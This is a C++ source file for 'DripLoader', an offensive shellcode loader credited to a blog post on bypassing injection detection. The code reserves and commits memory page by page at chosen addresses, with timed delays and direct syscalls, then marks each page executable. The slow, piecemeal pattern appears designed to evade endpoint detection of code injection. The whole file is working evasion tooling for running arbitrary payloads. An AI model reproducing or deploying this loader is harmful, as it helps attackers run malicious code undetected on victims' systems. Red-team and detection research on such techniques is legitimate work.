#include <Windows.h>
#include <stdint.h>
#include <vector>

#include "util.h"
#include "syscalls.h"

// Original blog on "DripLoader"
// https://web.archive.org/web/20210608220213/https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection

SIZE_T ALLOC_GRAN = 0x10000;
PVOID baseAddr = nullptr;
PVOID currentBase = nullptr;
std::vector<PVOID> reservedBlocks;

static PVOID checkBaseAddr(PVOID base, SIZE_T shellcodeLength)
{
	MEMORY_BASIC_INFORMATION mbi;
	SIZE_T numBlocks = (shellcodeLength / ALLOC_GRAN) + 1;

	NTSTATUS status = NtQueryVirtualMemory(
		CURRENT_PROCESS,
		base,
		MemoryBasicInformation,
		&mbi,
		sizeof(MEMORY_BASIC_INFORMATION),
		nullptr
	);
	if (status != 0)
	{
		DEBUG_LOG("Failed to query virtual memory: 0x%08X\n", status);
		return nullptr;
	}
	Delay(100);

	if (MEM_FREE == mbi.State) {
		DWORD i;
		for (i = 0; i < numBlocks; ++i) {
			LPVOID testBase = (void*)((DWORD_PTR)base + (i * ALLOC_GRAN));
			status = NtQueryVirtualMemory(
				CURRENT_PROCESS,
				testBase,
				MemoryBasicInformation,
				&mbi,
				sizeof(MEMORY_BASIC_INFORMATION),
				nullptr
			);
			if (status != 0)
			{
				DEBUG_LOG("Failed to query virtual memory: 0x%08X\n", status);
				break;
			}
			Delay(100);

			if (MEM_FREE != mbi.State)
				break;
		}
		if (i == numBlocks) {
			return base;
		}
	}

	return nullptr;
}

static PVOID getSuitableBaseAddress(SIZE_T shellcodeLength)
{
	const PVOID candidates[] = {
		(PVOID)0x0000000021000000,
		(PVOID)0x0000000010000000,
		(PVOID)0x0000000050000000,
		(PVOID)0x0000000040000000,
	};

	for (DWORD i = 0; i < 4; i++) {
		PVOID testAddr = checkBaseAddr(candidates[i], shellcodeLength);
		if (testAddr != nullptr) {
			return testAddr;
		}
	}

	return nullptr;
}

static BOOL allocateMemoryForShellcode(SIZE_T shellcodeLength)
{
	baseAddr = getSuitableBaseAddress(shellcodeLength);
	if (baseAddr == nullptr)
	{
		DEBUG_LOG("Failed to find a suitable base address\n");
		return FALSE;
	}

	NTSTATUS status;
	currentBase = baseAddr;
	SIZE_T numBlocks = (shellcodeLength / ALLOC_GRAN) + 1;
	for (DWORD i = 0; i < numBlocks; ++i)
	{
		status = NtAllocateVirtualMemory(
			CURRENT_PROCESS,
			&currentBase,
			0,
			&ALLOC_GRAN,
			MEM_RESERVE,
			PAGE_READWRITE
		);
		if (status != 0)
		{
			DEBUG_LOG("Failed to allocate memory for shellcode: 0x%08X\n", status);
			return FALSE;
		}

		Delay(100);

		reservedBlocks.push_back(currentBase);
		currentBase = (PVOID)((DWORD_PTR)currentBase + ALLOC_GRAN);
	}

	return TRUE;
}

static BOOL copyShellcode(PUCHAR shellcode, SIZE_T shellcodeLength)
{
	SIZE_T pageSize = 0x1000;
	SIZE_T numBlocks = (shellcodeLength / ALLOC_GRAN) + 1;
	SIZE_T numSegments = ALLOC_GRAN / pageSize;
	SIZE_T shellcodeOffset = 0;
	for (DWORD i = 0; i < numBlocks; ++i)
	{
		for (DWORD j = 0; j < numSegments; ++j)
		{
			currentBase = (PVOID)((DWORD_PTR)reservedBlocks[i] + (j * pageSize));
			NTSTATUS status = NtAllocateVirtualMemory(
				CURRENT_PROCESS,
				&currentBase,
				NULL,
				&pageSize,
				MEM_COMMIT,
				PAGE_READWRITE
			);
			if (status != 0)
			{
				DEBUG_LOG("Failed to commit memory for shellcode: 0x%08X\n", status);
				return FALSE;
			}
			Delay(60);

			if (shellcodeOffset + pageSize > shellcodeLength)
				pageSize = shellcodeLength - shellcodeOffset;

			if (pageSize == 0)
				break;

			memcpy(currentBase, &shellcode[shellcodeOffset], pageSize);
			shellcodeOffset += pageSize;

			ULONG oldProt = 0;
			status = NtProtectVirtualMemory(
				CURRENT_PROCESS,
				&currentBase,
				(PULONG)&pageSize,
				PAGE_EXECUTE_READ,
				&oldProt
			);
			if (status != 0)
			{
				DEBUG_LOG("Failed to protect memory for shellcode: 0x%08X\n", status);
				return FALSE;
			}
		}
	}

	return TRUE;
}

PVOID DripLoader(PUCHAR shellcode, SIZE_T shellcodeLength)
{
	SyscallInst = GetSyscallInst();
	if (SyscallInst == 0)
	{
		DEBUG_LOG("Failed to get syscall instruction address\n");
		return nullptr;
	}
	Delay(100);

	if (!allocateMemoryForShellcode(shellcodeLength))
	{
		DEBUG_LOG("Failed to allocate memory for shellcode\n");
		return nullptr;
	}
	Delay(100);

	if (!copyShellcode(shellcode, shellcodeLength))
	{
		DEBUG_LOG("Failed to make shellcode executable\n");
		return nullptr;
	}

	return baseAddr;
}
